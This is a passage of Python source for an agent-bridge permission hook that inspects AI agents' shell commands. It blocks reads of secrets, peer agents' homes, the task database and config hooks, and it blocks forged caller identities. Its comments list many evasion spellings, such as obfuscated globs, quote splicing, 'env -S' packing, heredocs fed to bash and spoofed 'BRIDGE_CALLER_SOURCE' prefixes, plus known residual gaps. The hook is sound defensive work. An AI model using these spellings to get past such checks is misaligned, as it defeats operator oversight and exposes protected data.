            # can select a forbidden dir under the read's effective cwd (or a
            # fail-branch prior), OR the raw word is itself bridge-anchored.
            for c in read_cwds:
                if _glob_word_hits_forbidden(raw_word, c, forbidden_dirs) is not None:
                    return _OBFUSCATED_SUFFIX_SENTINEL
            if any(anchor in raw_word for anchor in _bridge_anchor_tokens()) and \
                    _glob_prefix_reaches_forbidden_dir(raw_word, suffixes):
                return _OBFUSCATED_SUFFIX_SENTINEL

        # THEN apply this segment's cd change so the NEXT segment's reads see it.
        if disp == "skip":
            continue  # provably-skipped conditional cd — no cwd effect
        change = _segment_cwd_change(seg.strip())
        if change is None:
            continue
        new_cwd = _apply_cwd_change(cwd, change)
        if disp == "exec":
            # The cd advances the linear cwd, but it CAN fail → bash stays in the
            # PRIOR cwd. Record that prior as a current-chain fail-branch so a
            # later non-gated read (or any read after the next hard break, once
            # promoted sticky) re-checks it (codex #11822 / patch #11823 r10/r11).
            if isinstance(cwd, str):
                chain_cwds.append(cwd)
            cwd = new_cwd
        else:  # "union" — ambiguous conditional: the cd MAY run; model its target
            # as a current-chain fail-branch, but DON'T commit the linear cwd (the
            # skip branch keeps the prior cwd). `cmd && cd <bridge>; read` DENIES.
            if isinstance(new_cwd, str):
                chain_cwds.append(new_cwd)
    return None


def _glob_prefix_reaches_forbidden_dir(word: str, suffixes: list[str]) -> bool:
    """For a glob / command-sub *word*, expand ``$VAR`` / ``~`` in the
    literal prefix BEFORE the first wildcard / command-sub char and decide
    whether that prefix could select a forbidden directory.

    A forbidden directory is the absolute resolution of a forbidden suffix
    under the bridge home (``<home>/shared/secrets``, ``<home>/agents/
    other-a``). The glob can reach it when the resolved prefix is a string
    prefix of the forbidden dir (the wildcard sits at/above the protected
    leaf, e.g. ``…/agents/oth*r-a``) OR the forbidden dir is a prefix of the
    resolved prefix (the wildcard sits strictly INSIDE the forbidden tree).
    A read strictly inside the agent's OWN home (``…/agents/<self>/memory/
    *.md``) resolves to a prefix that is neither, so it is NOT denied.
    """
    # First wildcard / command-sub position.
    cut = len(word)
    for i, ch in enumerate(word):
        if ch in _OBFUSCATION_GLOB_CHARS or ch == "`" or word[i:i + 2] == "$(":
            cut = i
            break
    prefix = word[:cut]
    expanded = os.path.expandvars(os.path.expanduser(prefix))
    if not expanded:
        return True  # un-resolvable prefix → fail closed
    # The caller only reaches here for a BRIDGE-ANCHORED word. If a `$VAR`
    # survived expansion (a shell var Python's environ cannot see), the
    # static prefix is inconclusive — fail closed rather than risk a
    # var-spelled glob into the secret tree (the broader carve-out gates use
    # the same "unresolved expansion → fail closed" stance, #1690 r4 FIX 2).
    if "$" in expanded:
        return True
    bridge_home = str(bridge_home_dir())
    for suffix in suffixes:
        forbidden_dir = f"{bridge_home}{suffix}"
        if expanded.startswith(forbidden_dir) or forbidden_dir.startswith(expanded):
            return True
    return False


def _glob_word_hits_forbidden(
    word: str,
    cwd: object,
    forbidden_dirs: list[tuple[str, str]],
) -> str | None:
    """For a glob / command-sub *word*, decide whether — resolved against the
    effective *cwd* — it could select a path inside a forbidden directory
    (codex #11827 r11: ``cd $BH/shared && cat sec*ets/token`` resolves the
    relative wildcard under the bridge cwd). Returns the matched forbidden suffix
    or ``None``.

    Unlike :func:`_glob_prefix_reaches_forbidden_dir` (bridge-ANCHORED absolute
    word only), this resolves a RELATIVE glob against the cwd the read runs in,
    then component-wise ``fnmatch``-checks whether the pattern's leading
    components can match the forbidden dir. A glob that selects the protected
    directory ITSELF (equal depth) fails closed too — the guard is
    command-AGNOSTIC, and while ``cat sec*ets`` only errors on a directory, an
    ``ls``/``find``/``grep -r`` of the same glob ENUMERATES the protected tree
    (codex #11837 r12; consistent with the Stage-A ``ls …/private`` directory
    -reference contract). A shorter pattern that cannot even reach the forbidden
    dir's depth, or a component that does not ``fnmatch`` the forbidden name
    (``cat *.md`` under ``shared`` → no match on ``secrets``), is NOT denied."""
    if not any(ch in _OBFUSCATION_GLOB_CHARS for ch in word) \
            and "`" not in word and "$(" not in word:
        return None  # not a glob / command-sub word
    decoded = _decode_obfuscated_word(word)  # fold ANSI-C / backslash, keep globs
    expanded = _expand_bridge_prefixes(decoded)
    if "$" in expanded or "`" in expanded or "$(" in expanded:
        # Command-sub / unresolved $var inside the word: the literal prefix may
        # still anchor it. Fall back to the prefix-before-first-special check.
        cut = len(expanded)
        for i, ch in enumerate(expanded):
            if ch in _OBFUSCATION_GLOB_CHARS or ch == "`" or expanded[i:i + 2] == "$(" or ch == "$":
                cut = i
                break
        expanded = expanded[:cut]
        if not expanded:
            return None  # nothing literal to anchor on → leave to other passes
    if os.path.isabs(expanded):
        pattern = os.path.normpath(expanded)
    elif isinstance(cwd, str) and cwd is not _CWD_POISONED:
        pattern = os.path.normpath(os.path.join(cwd, expanded))
    else:
        return None  # relative + unknown/poisoned base → not resolvable here
    pat_parts = pattern.split(os.sep)
    for abs_dir, suffix in forbidden_dirs:
        dir_parts = abs_dir.split(os.sep)
        if len(pat_parts) < len(dir_parts):
            # The pattern is too shallow to even name the forbidden dir.
            continue
        # Equal depth → the glob selects the protected dir itself (ls/find
        # enumerate it); deeper → it reads a file strictly inside. Both leak.
        if all(fnmatch.fnmatch(dp, pp) for pp, dp in zip(pat_parts, dir_parts)):
            return suffix
    return None


# Sentinel deny-reason fragment for an obfuscated (un-analyzable) word that
# the fail-close path rejects. Surfaced in the deny message so the operator
# can tell a suffix hit from an obfuscation fail-close.
_OBFUSCATED_SUFFIX_SENTINEL = "(obfuscated path expansion)"


def _command_path_candidate_words(segments: list[str]):
    """Yield path-candidate words from the shell *segments*, tokenized with
    bash's real word-splitting + QUOTE REMOVAL via ``shlex.split(..., posix=True)``
    so ``sec'rets'`` / ``sec"rets"`` / ``secrets''`` / ``shared'/'secrets`` /
    ``"$BH/shared/secrets/token"`` collapse to their canonical word BEFORE
    resolution (patch r3 #11780 Family Q — bash removes quotes before the path
    exists, so a literal-text tokenizer left the quote chars in the path and the
    resolved string never equaled the forbidden dir). A ``$var`` is left intact
    for ``_expand_bridge_prefixes``. A segment with unbalanced quotes (shlex
    ``ValueError``) falls back to a raw split here; the caller separately
    fail-closes such a segment when it is bridge-anchored. Reuses
    :func:`_alias_path_fragments` per token to peel redirect prefixes."""
    for seg in segments:
        try:
            tokens = shlex.split(seg, posix=True, comments=False)
        except ValueError:
            tokens = seg.split()
        for token in tokens:
            for fragment in _alias_path_fragments(token):
                yield fragment


def _bash_token_resolved_paths(token: str) -> list[Path]:
    """Return resolved Paths for the path-shaped fragments of *token*.

    Mirrors `_token_matches_protected`'s expansion logic but yields
    Path objects instead of running an equality check, so the caller
    can run any decision against them.
    """
    out: list[Path] = []
    for fragment in _alias_path_fragments(token):
        expanded = os.path.expandvars(os.path.expanduser(fragment))
        if not expanded:
            continue
        try:
            out.append(Path(expanded))
        except Exception:
            continue
    return out


def _bash_argv_protected_decisions(
    text: str,
    agent: str,
) -> tuple[list[tuple[Path, str, str]], bool] | None:
    """Walk shlex tokens in *text* with the same skip / treat-as-value
    rules as `_bash_argv_references_path`. For every non-skipped token,
    resolve to one or more Paths. For Paths that land in another
    agent's home, run `_system_class_cross_agent_read_allowed` and
    record the decision.

    Returns ``None`` when shlex.split() raises (caller falls through to
    the substring deny). Otherwise returns ``(decisions, all_allowed)``:

    - ``decisions`` is a list of ``(path, audit_target, peer_key)``
      triples for every peer-agent token the carve-out admits.
      ``peer_key`` is the peer agent name — a stable string used by the
      text-occurrence proof step to compare counts without depending on
      symlink-resolved absolute paths (e.g. macOS ``/var`` →
      ``/private/var``).
    - ``all_allowed`` is False as soon as one resolved peer token sits
      outside the carve-out (peer outside ``memory/{projects,decisions,
      shared}/``).

    Shared/* tokens are deliberately NOT collected: shared/non-forbidden
    is broadly readable across classes (the file-tool carve-out emits
    audits for system-class shared reads — Bash-side shared audits are
    follow-up scope). Shared/private|shared/secrets are caught earlier
    by the unconditional Stage A substring deny.
    """
    home_root = agent_home_root()

    try:
        tokens = shlex.split(text, posix=True, comments=False)
    except ValueError:
        return None

    decisions: list[tuple[Path, str, str]] = []
    all_allowed = True

    def _classify_peer(path: Path) -> tuple[bool, str, str] | None:
        """Return (allowed, audit_target, peer_key) for cross-agent peer
        paths; None for paths outside the cross-agent territory."""
        rel_agent = _resolve_under(path, home_root)
        if rel_agent is None:
            return None
        parts = rel_agent.parts
        if not parts:
            return None
        peer = parts[0]
        if peer == agent:
            return None  # self-home, not a cross-agent reference
        allowed, audit_target = _system_class_cross_agent_read_allowed(
            path, agent
        )
        return allowed, audit_target, peer

    def _process_value(value: str) -> None:
        nonlocal all_allowed
        for path in _bash_token_resolved_paths(value):
            verdict = _classify_peer(path)
            if verdict is None:
                continue
            allowed, audit_target, peer_key = verdict
            if not allowed:
                all_allowed = False
                continue
            decisions.append((path, audit_target, peer_key))

    skip_next_payload = False
    treat_next_as_value = False
    for tok in tokens:
        if skip_next_payload:
            skip_next_payload = False
            continue
        if treat_next_as_value:
            treat_next_as_value = False
            _process_value(tok)
            continue
        if tok in _STRING_PAYLOAD_FLAGS:
            skip_next_payload = True
            continue
        if tok in _FILE_VALUED_FLAGS:
            treat_next_as_value = True
            continue
        if tok.startswith("--") and "=" in tok:
            flag, _, value = tok.partition("=")
            if flag in _STRING_PAYLOAD_FLAGS:
                continue
            _process_value(value)
            continue
        _process_value(tok)

    return decisions, all_allowed


def _argv_occurrences_explain_text(
    text: str,
    peer_aliases: list[str],
    decisions: list[tuple[Path, str, str]],
) -> bool:
    """Return True iff every peer-alias substring occurrence in *text*
    is exactly accounted for by a decision in *decisions*.

    Both sides key on the peer agent name (the last segment of the
    alias, also `decisions[*][2]`). Multiple alias variants pointing at
    the same peer collapse to the same key. Counts must match — if
    text mentions peer X twice but only one argv token resolved to
    peer X, a smuggle (e.g. second occurrence inside a quoted blob the
    argv parser cannot surface) is suspected.

    Variants overlap (the no-trailing-slash form is a prefix of the
    trailing-slash form). We sort by length descending and "consume"
    matched ranges with NUL so the shorter form doesn't double-count.
    """
    sorted_aliases = sorted(peer_aliases, key=len, reverse=True)

    def _peer_for_alias(alias: str) -> str:
        return alias.rstrip("/").rsplit("/", 1)[-1]

    consumed = list(text)
    text_count: dict[str, int] = {}
    for alias in sorted_aliases:
        peer = _peer_for_alias(alias)
        if not peer:
            continue
        n = len(alias)
        i = 0
        while True:
            joined = "".join(consumed)
            idx = joined.find(alias, i)
            if idx < 0:
                break
            for k in range(idx, idx + n):
                consumed[k] = "\0"
            text_count[peer] = text_count.get(peer, 0) + 1
            i = idx + n

    decision_count: dict[str, int] = {}
    for _path, _audit, peer_key in decisions:
        decision_count[peer_key] = decision_count.get(peer_key, 0) + 1

    for peer in set(text_count) | set(decision_count):
        if text_count.get(peer, 0) != decision_count.get(peer, 0):
            return False
    return True


def _assignment_value(token: str) -> str | None:
    """Return the VALUE of a ``NAME=value`` shell-assignment-shaped *token*,
    or None when *token* is not an assignment.

    Mirrors the assignment shape recognized by ``_stage_has_dangerous_env_prefix``
    / ``_stage_first_token``: ``NAME`` must be a bare shell identifier (no
    ``/``, not an option starting with ``-``). Used to surface a protected
    path that rides inside an env-prefix assignment value —
    ``DB=/…/tasks.db sqlite3 "$DB" …`` / ``BRIDGE_TASK_DB=/…/tasks.db sqlite3
    "$BRIDGE_TASK_DB" …`` — which is statically present in the command string
    but hidden from the plain positional path check because the whole
    ``NAME=value`` is one shlex token (Issue #1786 codex r1; same
    static-decodable class as #1709, distinct from the runtime-only ``$var``
    indirection tracked in #1738). The caller checks the value of EVERY
    assignment-shaped token, not only the leading env prefix: a value that
    statically spells the queue DB path is a path-naming regardless of
    position, and over-matching a coincidental non-protected value is
    harmless (the value still has to equal the exact protected path).
    """
    if "=" not in token or token.startswith("-"):
        return None
    name, _, value = token.partition("=")
    if not name or "/" in name:
        return None
    # A valid bare shell identifier: [A-Za-z_][A-Za-z0-9_]*.
    if not re.fullmatch(r"[A-Za-z_][A-Za-z0-9_]*", name):
        return None
    return value


def _bash_argv_references_path(command: str, protected: Path) -> bool:
    """Return True if *command*, interpreted as shell argv, names
    *protected* as a filesystem argument — either positionally, as the
    value of a file-valued option flag like ``--body-file`` / ``-F``, or
    inside a leading ``NAME=value`` env-prefix assignment value (Issue
    #1786 codex r1).

    Behaviour contract (round-2 of PR #260 review):

    - shlex-split the command into tokens.
    - Skip tokens consumed by string-payload option flags
      (``--body`` / ``-m`` / ``--message`` / ``--description`` /
      ``--title`` / ``--notes`` / ``--subject``) — these are message
      bodies the command sends somewhere else, not paths it opens.
      The ``--flag=value`` packed form is skipped whole for the same
      reason.
    - Treat file-valued option flags (``--body-file`` / ``-F`` /
      ``--file`` / ``--input``) as if the next token (or ``=value``
      half) were positional: run the same path check over it.
      Codex r2 caught that skipping these unblocked direct reads of
      the protected file.
    - Normalise every remaining positional token via
      :func:`_alias_path_fragments` (strip trailing shell operators,
      peel redirection prefixes) before the ``expanduser + expandvars
      + Path ==`` comparison. ``sqlite3 /db;``, ``cat <db``, and
      ``sqlite3 /db&& echo ok`` all surface the protected path.
    - A ``shlex.split`` ``ValueError`` (unbalanced quotes etc.) falls
      back to a substring match against the absolute path so an
      evasion attempt via malformed shell is not strictly weaker than
      the pre-#252 check.
    """
    protected_str = str(protected)
    if not protected_str:
        return False
    try:
        tokens = shlex.split(command, posix=True, comments=False)
    except ValueError:
        return protected_str in command

    # Issue #1014 C: resolve a leading `cd <dir>` prelude so a CWD-relative
    # reference to the protected file (`cd $BRIDGE_HOME && … agent-roster
    # .local.sh`) is detected, not silently missed. Pass the RAW command —
    # the prelude detector splits on the shell-operator model so `;` /
    # newline separators (no-space forms) are recognized too.
    cd_base_dir = _command_cd_base_dir(command)

    def _check_value_token(value: str) -> bool:
        return _token_matches_protected(value, protected, cd_base_dir)

    skip_next_payload = False
    treat_next_as_value = False
    for tok in tokens:
        if skip_next_payload:
            skip_next_payload = False
            continue
        if treat_next_as_value:
            treat_next_as_value = False
            if _check_value_token(tok):
                return True
            continue
        if tok in _STRING_PAYLOAD_FLAGS:
            skip_next_payload = True
            continue
        if tok in _FILE_VALUED_FLAGS:
            # Next argv word is the file path the command will read.
            treat_next_as_value = True
            continue
        if tok.startswith("--") and "=" in tok:
            flag, _, value = tok.partition("=")
            if flag in _STRING_PAYLOAD_FLAGS:
                # --body=foo: value is a literal message body, skip.
                continue
            if flag in _FILE_VALUED_FLAGS:
                # --body-file=<path>: value is a filesystem read, check it.
                if _check_value_token(value):
                    return True
                continue
            # Unknown --flag=value: fall through and check the value as if
            # it were positional. Safer to block a real opener than to let
            # a novel gh/git flag escape the check.
            if _check_value_token(value):
                return True
            continue
        # Issue #1786 (codex r1): a `NAME=value` env-prefix assignment whose
        # VALUE statically spells the protected path
        # (`DB=/…/tasks.db sqlite3 "$DB" …`). The value is decoded the same way
        # a positional token is. Checked regardless of whether the variable is
        # later referenced — the path is named in the command string, which is
        # the queue-DB WRITE-contract trigger (the var-ref `"$DB"` is just the
        # opener). This closes the same static-decodable class #1709 covered;
        # runtime-only `$var` indirection without a literal value is #1738.
        assign_value = _assignment_value(tok)
        if assign_value is not None and _check_value_token(assign_value):
            return True
        if _token_matches_protected(tok, protected, cd_base_dir):
            return True
    return False


def _bash_argv_references_system_config(command: str) -> bool:
    """Return True if any positional/file-valued argv token in *command*
    points at a path that :func:`is_protected_path` matches.

    Uses the same skip/treat rules as ``_bash_argv_references_path`` so a
    `--body "agents/foo/.discord/access.json"` mention does not trigger.
    A `shlex.split` ``ValueError`` (unbalanced quotes etc.) falls back to
    a substring scan of the literal suffixes derived from
    :func:`system_config_paths.protected_literal_suffixes` — the single
    source of truth. The fallback is weaker than the structural argv
    check but keeps us no worse than the pre-#341 baseline, and it
    cannot drift from ``PROTECTED_GLOBS`` because the suffix list is
    derived at call time.
    """
    if not command:
        return False
    try:
        tokens = shlex.split(command, posix=True, comments=False)
    except ValueError:
        # Substring fallback: shlex rejected the command (commonly an
        # unbalanced apostrophe inside a heredoc body — `It's foo` etc.).
        # The shorter needles in protected_literal_suffixes (`hooks/`,
        # `state/cron/`) match too eagerly when prose mentions them
        # mid-sentence (e.g. a handoff body that documents the hook
        # chain). Require each needle to sit at a path-boundary:
        # start-of-string or preceded by a token-boundary character
        # (redirection `>`/`<`, quote, paren, assignment `=`, fd `&`,
        # pipe `|`, separator `;`/`,`, plus the original `/`, `~`, `$`).
        # Whitespace is deliberately excluded so heredoc prose preceded
        # by a space still passes — see _PATH_PREFIX_CHARS for rationale.
        #
        # Issue #1574: when the command is the one provably-inert report-write
        # shape — `[VAR=val]* (cat|tee) [>file] <<'DELIM' … DELIM` with a QUOTED
        # delimiter and the heredoc as the last thing (see
        # _command_is_simple_inert_quoted_heredoc_write) — strip the literal
        # body before the scan. That body is file CONTENT written verbatim, so a
        # report to a NON-config area (e.g.
        # `cat > ~/.agent-bridge/shared/report.md <<'EOF'`) whose prose merely
        # documents the hook chain (a path-boundary `'hooks/…'` / `>hooks/…`
        # inside the body) was false-positive-blocked as a "system config path".
        # The redirect TARGET stays on the scan surface (the strip keeps the
        # head up to `<<'DELIM'`), so a real write whose destination IS a
        # protected path — `cat >hooks/evil.py <<'EOF'…`, `tee
        # agent-roster.local.sh <<'EOF'…` — is still denied.
        #
        # For ANY other shape the raw command stays on the scan surface,
        # preserving the pre-#1574 deny behavior. This is deliberate: a body fed
        # to a stdin-executing interpreter — directly (`bash <<EOF`), via pipe
        # (`cat <<EOF | bash`), via process substitution (`cat > >(bash) <<EOF`,
        # codex r2), or via a variable-backed FIFO (`cmd=bash; mkfifo p; $cmd <p
        # & cat >p <<EOF`, codex r3) — is EXECUTED, so a `>hooks/evil.py` inside
        # it is a real protected write that must keep denying. Proving a
        # free-form command's body inert is undecidable; matching one narrow,
        # metachar-free, quoted-delimiter shape is decidable and fail-closed.
        scan = command
        if _command_is_simple_inert_quoted_heredoc_write(command):
            scan = _strip_heredoc_and_herestring_body(command)
        return _command_substring_hits_protected_needle(scan)

    # Issue #1014 C: resolve a leading `cd <dir>` prelude so a CWD-relative
    # reference to a protected system-config file is detected — same
    # bypass class as the roster path in _bash_argv_references_path. Pass
    # the RAW command so `;` / newline separators are recognized.
    cd_base_dir = _command_cd_base_dir(command)

    def _check_value(value: str) -> bool:
        for fragment in _alias_path_fragments(value):
            expanded = os.path.expandvars(os.path.expanduser(fragment))
            if not expanded:
                continue
            try:
                candidate = Path(expanded)
            except Exception:
                continue
            if is_protected_path(candidate):
                return True
            if cd_base_dir is not None and not candidate.is_absolute():
                try:
                    if is_protected_path(cd_base_dir / candidate):
                        return True
                except Exception:
                    pass
        return False

    skip_next_payload = False
    treat_next_as_value = False
    for tok in tokens:
        if skip_next_payload:
            skip_next_payload = False
            continue
        if treat_next_as_value:
            treat_next_as_value = False
            if _check_value(tok):
                return True
            continue
        if tok in _STRING_PAYLOAD_FLAGS:
            skip_next_payload = True
            continue
        if tok in _FILE_VALUED_FLAGS:
            treat_next_as_value = True
            continue
        if tok.startswith("--") and "=" in tok:
            flag, _, value = tok.partition("=")
            if flag in _STRING_PAYLOAD_FLAGS:
                continue
            if flag in _FILE_VALUED_FLAGS:
                if _check_value(value):
                    return True
                continue
            if _check_value(value):
                return True
            continue
        if _check_value(tok):
            return True
    return False


def _is_config_set_wrapper(text: str) -> bool:
    """True iff *text* is the sanctioned ``agent-bridge config set`` /
    ``agb config set`` wrapper invocation as a single, side-effect-free
    shell command.

    The hook normally denies any Bash command whose argv mentions a
    protected path. That blocks the very wrapper #341 prescribes:
    ``agent-bridge config set --path <protected> --change ...`` was
    routed through `_bash_argv_references_path()` and rejected because
    the protected path appears as the wrapper's argument — wrapper
    self-block deadlock, even for admin (the deny message itself points
    operators back at the same wrapper they were trying to call).

    The wrapper layers its own gate (`bridge-config.py:detect_caller_source`
    + before/after sha256 audit row), so once we let it through the hook
    the only thing that changes is "audit chain stops being doubled".
    A non-operator caller still gets denied at the wrapper.

    Match shape (strict — codex r2 #726):

    - The text contains *no* shell separators (`;` / `&&` / `||` / `|` /
      `&` / newline). Multi-command pipelines drop straight back to the
      regular path-argv gate so a trailing `; sqlite3 .../tasks.db
      .dump` cannot ride through.
    - The text contains *no* shell embeddings — command substitution
      (``$(...)`` / backticks), process substitution (``<(...)`` /
      ``>(...)``), heredoc / here-string (``<<`` / ``<<<``).
      ``--change foo=$(sqlite3 .../tasks.db .dump)`` would otherwise
      let the shell read the queue DB before the wrapper even starts.
    - The text contains *no* I/O redirection tokens (``>`` / ``>>`` /
      ``<`` / ``&>``, 2>`` other than the SAFE stderr-discard forms).
      ``... > ~/.agent-bridge/agent-roster.local.sh`` would otherwise
      let the shell open/truncate the protected file before any
      argv-side gate runs.
    - shlex tokens[0] leaf is ``agent-bridge`` or ``agb`` (path prefix
      tolerated).
    - Subcommand sits at the strict positional ``tokens[1] == "config"``
      and ``tokens[2] == "set"``. A later embedded ``config set`` inside
      a different subcommand's argv (e.g. ``agent-bridge wave run config
      set``) does not fire the carve-out.

    ``config get`` / ``config list-protected`` keep the existing
    read-intent carve-out — this helper is only for the write surface
    that the path-argv gate would otherwise self-block.
    """
    # Reject shell embeddings on raw text first. `_command_has_shell_embedding`
    # catches `$(...)`, backticks, `<(...)`, `>(...)`, `<<` / `<<<` — these
    # are the signals we want, so we deliberately don't pre-sanitize. Same
    # threat shape as multi-command pipelines: the shell evaluates the
    # embedded command before the wrapper process even runs, so
    # bridge-config.py cannot guard the file the subshell opens (codex
    # r2 #726).
    if _command_has_shell_embedding(text):
        return False
    # Strip the safe stderr-suppression / fd-dup tokens BEFORE the
    # multi-command and redirection checks. `2>&1` legitimately contains
    # the `&` token-boundary character that `_COMMAND_OPERATOR_RE` would
    # otherwise read as a backgrounding signal, and `2>/dev/null` looks
    # like output redirection but cannot mutate the filesystem. The safe
    # forms must remain allowed for the carve-out to be useful in
    # `2>/dev/null`-suffixed wrapper invocations.
    sanitized = _SAFE_REDIRECT_RE.sub(" ", text)
    # Reject *any* remaining `<` / `>` after the safe-redirect strip.
    # bash accepts arbitrary numeric file-descriptor prefixes
    # (`1>`, `0<`, `3<`, `9>>`, `3<>`, ...) — the codex r3 #726 review
    # caught that the previous per-token `tok.startswith(">")` check
    # missed `1>`, `0<`, etc. and let the shell open/truncate/read a
    # protected path before the wrapper started. Any `<` or `>` outside
    # the safe-redirect forms means the shell is doing I/O the wrapper
    # cannot guard.
    if "<" in sanitized or ">" in sanitized:
        return False
    # Reject multi-command pipelines. shlex does not treat shell
    # operators as separators — `agent-bridge config set --path X;
    # sqlite3 .../tasks.db .dump` arrives as one shlex run, and a naive
    # leaf check would hand the whole text a None reason and let the
    # second command bypass the queue-DB / system-config gates. The
    # carve-out only applies when the wrapper invocation stands alone.
    if _COMMAND_OPERATOR_RE.search(sanitized):
        return False
    try:
        tokens = shlex.split(sanitized, posix=True, comments=False)
    except ValueError:
        return False
    if len(tokens) < 3:
        return False
    leaf = tokens[0].rsplit("/", 1)[-1]
    if leaf not in {"agent-bridge", "agb"}:
        return False
    return tokens[1] == "config" and tokens[2] == "set"


# Issue #1734 — `config set-env` exact-shape, admin-only, anti-spoof gate.
#
# `set-env` writes a durable install env override through the audited
# bridge-config.py wrapper (admin identity + operator caller-source). The
# hook must let the SANCTIONED shape through (so an admin agent can call it)
# while denying every smuggling shape. Unlike `config set`, `set-env` names
# NO protected path in argv (the managed file is implicit), so the path-argv
# gate would NOT catch a malformed call — `_admin_bridge_verb_check` would
# fall through to the peer/shared gate, which ALLOWS a command that does not
# name a peer home. That is the hole this dedicated gate closes.
#
# The critical extra teeth over `_is_config_set_wrapper` is the
# ENV-ASSIGNMENT-PREFIX anti-spoof: a normal agent shell must not be able to
# run `BRIDGE_CALLER_SOURCE=operator-tui agb config set-env ...` to forge the
# very caller-source / agent-id the wrapper's trust gate reads. shlex.split
# would put the `VAR=value` token at tokens[0], so the leaf check alone would
# (correctly) NOT match `agb` — but it would then fall through to a silent
# allow. We detect the leading assignment explicitly and DENY.
_LEADING_ENV_ASSIGN_RE = re.compile(r"^\s*[A-Za-z_][A-Za-z0-9_]*=")


def _has_leading_env_assignment(text: str) -> bool:
    """True iff *text* begins with a `VAR=value` env-assignment prefix.

    A leading `NAME=...` token (before the command word) is the shell's
    per-command environment override. We refuse it on a `config set-env`
    invocation so an agent cannot pre-seed `BRIDGE_CALLER_SOURCE` /
    `BRIDGE_AGENT_ID` into the wrapper's process env and spoof the trust
    gate. Matched on the RAW leading text (before shlex) because shlex
    happily tokenizes `VAR=value cmd` and the assignment would otherwise
    pass unnoticed.
    """
    return bool(_LEADING_ENV_ASSIGN_RE.match(text))


# GNU coreutils `env -S` / `--split-string` re-parses its single STRING argument
# into env-assignments + a command word at runtime. That packs the whole
# `A=b /path/agent-bridge` (or even the full verb triple) inside ONE shell token,
# hiding it from a naive shlex scan (codex r3 #11726). `_expand_env_split_string`
# re-parses any such payload so the verb triple becomes visible again; the
# canonical-shape gate then denies it (token[0] is `env`, not the bare verb).
_ENV_SPLIT_SHORT_RE = re.compile(r"^-[A-Za-z]*S")

# Shell quote/escape characters. A raw-substring prefilter on the command text
# is unsound: bash quote-concatenation (`set"-"env`, `set-en''v`) or backslash
# escaping (`set\-env`) spells the same `set-env` token while breaking the
# literal substring, yet shlex still resolves the real token (codex r5 #11733).
# We strip these for the substring PREFILTER only — the token scan itself uses
# real shlex — so the concatenated spelling still trips the prefilter. Stripping
# only makes the prefilter MORE permissive (more commands reach the sound shlex
# scan below), never less, so it cannot introduce a false-negative.
_SHELL_QUOTE_ESCAPE_RE = re.compile(r"""['"\\]""")


def _expand_env_split_string(toks: list[str]) -> list[str]:
    """Inline any `env -S <STRING>` payload as freshly-parsed tokens.

    Handles `--split-string=STRING`, `--split-string STRING`, the short `-S`
    standalone (payload is the next token), the short `-S<inline>` form, and
    bundled short flags ending in S (`-iS`, `-vS`). Unknown/other tokens pass
    through untouched. A payload that will not shlex-parse is kept verbatim
    (fail-closed: still surfaces its literal text to the scan).
    """
    out: list[str] = []
    i = 0
    n = len(toks)
    while i < n:
        t = toks[i]
        payload: str | None = None
        if t == "--split-string" and i + 1 < n:
            payload = toks[i + 1]
            i += 2
        elif t.startswith("--split-string="):
            payload = t[len("--split-string="):]
            i += 1
        elif _ENV_SPLIT_SHORT_RE.match(t):
            rest = t[t.index("S") + 1:]
            if rest:
                payload = rest
                i += 1
            elif i + 1 < n:
                payload = toks[i + 1]
                i += 2
            else:
                i += 1
        else:
            out.append(t)
            i += 1
            continue
        if payload is not None:
            try:
                out.extend(shlex.split(payload, posix=True, comments=False))
            except ValueError:
                out.append(payload)
    return out


def _config_set_env_attempt_present(text: str) -> bool:
    """True iff ANY command stage of *text* is a `config set-env` attempt —
    recognition by ALLOWLIST INVERSION (patch r3 #11718, codex r2 #11717 / r3
    #11726).

    Enumerating the bad prefixes (`env`/`exec`/`nice`/… plus `env -i`/`env --`
    options, plus the shell reserved words `time`/`!` and the `(`/`{` grouping
    metacharacters) is whack-a-mole against shell grammar. Instead we RECOGNIZE
    broadly: in every separator-split stage, after expanding any `env -S` payload
    and stripping ONLY leading bare `VAR=value` env-assignments (NOT prefix
    commands), we look at ANY position in the shlex token list for either spelling
    that reaches the wrapper:
      • the canonical-wrapper triple ``(agb|agent-bridge) config set-env``, or
      • the direct-script spelling ``bridge-config.py set-env`` (codex r3 #11726
        — `set-env` has no protected-path argv backstop, so a direct
        `python3 bridge-config.py set-env …` invocation would otherwise bypass
        the hook entirely).
    So `time A=b agb config set-env`, `env -i A=b agb config set-env`,
    `env -S 'A=b agent-bridge' config set-env`, `(A=b agb config set-env)`, and
    `python3 bridge-config.py set-env` are all recognized. The caller then ALLOWS
    only the exact canonical stand-alone wrapper shape and DENIES every other
    recognized form — closing the whole prefix/keyword/option/direct-script class
    without enumerating it. Quoted/body mentions (`echo 'agb config set-env'`,
    `--body "…"`) collapse to a single shlex token, so no spelling appears → NOT
    recognized → unaffected. Unparseable stages are skipped.

    Residual (out of a static hook's reach, tracked as the #341 env-trust root):
    indirection that hides the literal spelling — `eval '…'`, `bash -c '…'`,
    `V=set-env; agb config $V …`, or ANSI-C `$'\x73et-env'` — cannot be resolved
    from the command string (shlex does not expand them either). The durable fix
    is wrapper-side identity (bridge-config.py must not trust env-declared
    admin/source); the hook is defense-in-depth, not the boundary.
    """
    # Bash removes line continuations (`\<newline>`, `\<CR><newline>`) BEFORE
    # tokenizing, so `set-\<NL>env` runs as the argv token `set-env` — but
    # neither the substring prefilter nor shlex collapse them (codex r6 #11742).
    # Join them first (same lexical-normalization family as the r5 quote/escape
    # strip) so the spelling is normalized for both the prefilter and the scan.
    text = text.replace("\\\r\n", "").replace("\\\n", "")
    if "set-env" not in _SHELL_QUOTE_ESCAPE_RE.sub("", text):
        return False
    for stage in _COMMAND_OPERATOR_RE.split(text):
        scan = _SAFE_REDIRECT_RE.sub(" ", stage)
        # Neutralize subshell grouping parens. bash needs NO space after `(`
        # (`(agb config set-env)` is a valid subshell), but shlex glues `(agb`
        # into one token and the verb triple would hide. Replacing `(`/`)` with
        # spaces exposes the inner command for the scan; the canonical-shape gate
        # still sees the original parens in `sanitized` and denies it.
        scan = scan.replace("(", " ").replace(")", " ")
        try:
            toks = shlex.split(scan, posix=True, comments=False)
        except ValueError:
            continue
        # `env -S '<packed>'` re-parses its payload into tokens at runtime —
        # expand it so a hidden verb triple/spelling becomes visible.
        toks = _expand_env_split_string(toks)
        # Strip ONLY leading bare `VAR=value` env-assignments (a per-command env
        # override the shell applies before the verb). Do NOT strip prefix
        # commands here — the canonical-shape gate below rejects them instead.
        while toks and "=" in toks[0] and _LEADING_ENV_ASSIGN_RE.match(toks[0] + " "):
            toks.pop(0)
        # Either recognized spelling at ANY index → recognized attempt.
        for i in range(len(toks) - 1):
